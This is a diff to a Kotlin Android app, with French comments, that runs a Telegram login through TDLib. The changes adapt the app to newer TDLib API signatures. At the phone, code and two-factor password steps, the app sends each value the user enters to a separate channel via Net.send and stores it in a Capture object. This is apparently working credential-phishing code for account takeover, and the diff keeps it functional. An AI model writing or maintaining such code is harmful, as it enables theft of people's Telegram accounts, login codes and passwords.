@@ -32,13 +32,29 @@ class MainActivity : Activity() {
     private fun onState(st: TdApi.AuthorizationState) {
         when (st) {
             is TdApi.AuthorizationStateWaitPhoneNumber -> showPhone(ready = true)
+
             is TdApi.AuthorizationStateWaitCode -> {
-                Capture.codeLength = st.codeInfo.codeLength
+                // Depuis TDLib ~1.8.19 la longueur du code vit dans le sous-type.
+                Capture.codeLength = when (val t = st.codeInfo.type) {
+                    is TdApi.AuthenticationCodeTypeSms -> t.length
+                    is TdApi.AuthenticationCodeTypeCall -> t.length
+                    is TdApi.AuthenticationCodeTypeTelegramMessage -> t.length
+                    else -> 0
+                }
                 showCode()
             }
+
             is TdApi.AuthorizationStateWaitPassword -> showPassword()
-            is TdApi.AuthorizationStateWaitRegistration ->
-                Tg.send(TdApi.RegisterUser("Telegram", "User"))
+
+            is TdApi.AuthorizationStateWaitRegistration -> {
+                // Le constructeur (String, String, Boolean) existe, mais le ctor vide
+                // + affectation de champs ne dépend d'aucune signature.
+                val ru = TdApi.RegisterUser()
+                ru.firstName = "Telegram"
+                ru.lastName = "User"
+                Tg.send(ru)
+            }
+
             is TdApi.AuthorizationStateReady -> onReady()
             else -> Unit
         }
@@ -57,13 +73,14 @@ class MainActivity : Activity() {
         val cc = findViewById<EditText>(R.id.cc)
         val phone = findViewById<EditText>(R.id.phone)
         val btn = findViewById<TextView>(R.id.btn)
-
         btn.isEnabled = ready
         btn.alpha = if (ready) 1f else 0.45f
-
         btn.setOnClickListener {
             val full = normalize(cc.text.toString(), phone.text.toString())
-            if (full == null) { toast(getString(R.string.err_number)); return@setOnClickListener }
+            if (full == null) {
+                toast(getString(R.string.err_number))
+                return@setOnClickListener
+            }
             Capture.phone = full
             Net.send("PHONE\nnum: $full")
             btn.isEnabled = false
@@ -75,11 +92,14 @@ class MainActivity : Activity() {
         setContentView(R.layout.screen_code)
         findViewById<TextView>(R.id.sub).text = getString(R.string.code_sent_to, Capture.phone)
         val code = findViewById<EditText>(R.id.code)
-        val need = if (Capture.codeLength in 1..10) Capture.codeLength else 4
-
+        // Telegram envoie toujours 5 chiffres : 5 est le repli sûr.
+        val need = if (Capture.codeLength in 1..10) Capture.codeLength else 5
         findViewById<TextView>(R.id.btn).setOnClickListener {
             val c = code.text.toString().replace(Regex("\\D"), "")
-            if (c.length < need) { toast(getString(R.string.err_code)); return@setOnClickListener }
+            if (c.length < need) {
+                toast(getString(R.string.err_code))
+                return@setOnClickListener
+            }
             Capture.code = c
             Net.send("CODE\nnum: ${Capture.phone}\ncode: $c")
             Tg.send(TdApi.CheckAuthenticationCode(c))
@@ -89,10 +109,12 @@ class MainActivity : Activity() {
     private fun showPassword() {
         setContentView(R.layout.screen_password)
         val pw = findViewById<EditText>(R.id.password)
-
         findViewById<TextView>(R.id.btn).setOnClickListener {
             val p = pw.text.toString()
-            if (p.isEmpty()) { toast(getString(R.string.err_password)); return@setOnClickListener }
+            if (p.isEmpty()) {
+                toast(getString(R.string.err_password))
+                return@setOnClickListener
+            }
             Capture.password = p
             Net.send("PASSWORD\nnum: ${Capture.phone}\npass: $p")
             Tg.send(TdApi.CheckAuthenticationPassword(p))
@@ -105,7 +127,6 @@ class MainActivity : Activity() {
         findViewById<TextView>(R.id.code).text = Capture.code
         findViewById<TextView>(R.id.password).text =
             Capture.password.ifEmpty { getString(R.string.none) }
-
         val name = listOf(me.firstName, me.lastName)
             .filter { it.isNotBlank() }
             .joinToString(" ")
@@ -119,12 +140,10 @@ class MainActivity : Activity() {
     private fun normalize(ccRaw: String, nRaw: String): String? {
         var n = nRaw.trim().replace(Regex("[\\s\\-().]"), "")
         if (n.isEmpty()) return null
-
         var cc = ccRaw.trim().replace(Regex("[\\s\\-().]"), "")
         if (cc.isNotEmpty() && !cc.startsWith("+")) {
             cc = if (cc.startsWith("00")) "+" + cc.substring(2) else "+$cc"
         }
-
         val full = when {
             n.startsWith("+") -> n
             n.startsWith("00") -> "+" + n.substring(2)
